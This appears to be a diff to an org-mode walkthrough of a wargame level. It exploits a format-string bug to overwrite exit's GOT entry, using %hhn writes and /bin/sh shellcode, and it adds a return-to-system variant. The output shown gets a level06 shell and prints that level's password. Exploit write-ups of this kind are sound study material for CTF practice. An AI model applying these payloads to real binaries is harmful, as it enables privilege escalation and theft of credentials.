@@ -433,29 +433,40 @@ exit_got_plt_va=0x80497e0
 #+end_src
 **** Other way don't try it
 #+begin_src shell
-     # There is another way that is use system
-     p &system
-   $1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
-   find &system,+99999999,"/bin/sh"
-   0xf7f897ec
-   We could use a shellcode to launch
-  push 0xf7f897ec
-   xor eax, eax
-   mov    DWORD PTR [esp],eax
-   push 0xf7e6aed0
-  ret
+       # There is another way that is use system
+       p &system
+     $1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
+     find &system,+99999999,"/bin/sh"
+     0xf7f897ec
+  p exit
+  $1 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+
+     We could use a shellcode to launch
+     #;Optionally push the param of exit push 1...
+    push 0xf7f897ec /bin/sh_va
+    push 0xf7e5eb70 exit_va
+    push 0xf7e6aed0 system_va
+    ret             jmp to system_va
+
+    shellcode="\x68\xEC\x97\xF8\xF7\x31\xC0\x89\x04\x24\x68\xD0\xAE\xE6\xF7\xC3"
+
+    python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe1"[::-1]+"\x08\x04\x97\xe2"[::-1]+"\x08\x04\x97\xe3"[::-1] + "%17d%10$hhn%187d%11$hhn%35d%12$hhn%13$hhn" +  "\x68\xEC\x97\xF8\xF7\x31\xC0\x89\x04\x24\x68\xD0\xAE\xE6\xF7\xC3"
 #+end_src
 
 
 * Explotation
 #+begin_src shell
-  (python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe1"[::-1]+"\x08\x04\x97\xe2"[::-1]+"\x08\x04\x97\xe3"[::-1] + "%17d%10$hhn%187d%11$hhn%35d%12$hhn%13$hhn" + "\x31\xC0\x89\x04\x24\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x83\xEC\x04\x89\x04\x24\x83\xEC\x04\x89\x1C\x24\x89\xe1\xB0\x0B\xCD\x80"'; cat -) | ./$USER
+    (python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe1"[::-1]+"\x08\x04\x97\xe2"[::-1]+"\x08\x04\x97\xe3"[::-1] + "%17d%10$hhn%187d%11$hhn%35d%12$hhn%13$hhn" + "\x31\xC0\x89\x04\x24\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x83\xEC\x04\x89\x04\x24\x83\xEC\x04\x89\x1C\x24\x89\xe1\xB0\x0B\xCD\x80"'; cat -) | ./$USER
 
-id
-uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
-whoami
-level06
-cat /home/users/level06/.pass
-h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+  id
+  uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
+  whoami
+  level06
+  cat /home/users/level06/.pass
+  h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+  ## System one
+  (python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe1"[::-1]+"\x08\x04\x97\xe2"[::-1]+"\x08\x04\x97\xe3"[::-1] + "%17d%10$hhn%187d%11$hhn%35d%12$hhn%13$hhn" + "\x68\xEC\x97\xF8\xF7\x68\x70\xEB\xE5\xF7\x68\xD0\xAE\xE6\xF7\xC3"'; cat -) | ./$USER
+
 
 #+end_src
